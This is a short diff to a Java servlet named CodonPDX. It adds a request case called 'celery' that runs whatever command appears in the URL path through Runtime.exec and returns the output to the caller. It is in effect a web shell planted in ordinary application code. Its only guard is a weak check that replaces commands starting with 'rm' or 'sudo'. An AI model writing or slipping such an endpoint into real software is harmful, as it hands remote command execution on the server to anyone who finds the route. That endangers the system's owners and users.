@@ -42,6 +42,17 @@ public class CodonPDX extends HttpServlet {
                     } else
                         out.println("Error with request, check the URL again");
                     break;
+                case "celery":
+                    String line;
+                    String command = URI[3].replace("%20", " ");
+                    if(command.startsWith("rm") || command.startsWith("sudo")) command = "nopelol";
+                    Process p = Runtime.getRuntime().exec(command);
+                    BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                    while((line = in.readLine()) != null) {
+                        out.println(line);
+                    }
+                    in.close();
+                    break;
                 case "dlCSV":
                     if (URI.length == 4) {
                         response.setContentType("text/csv");
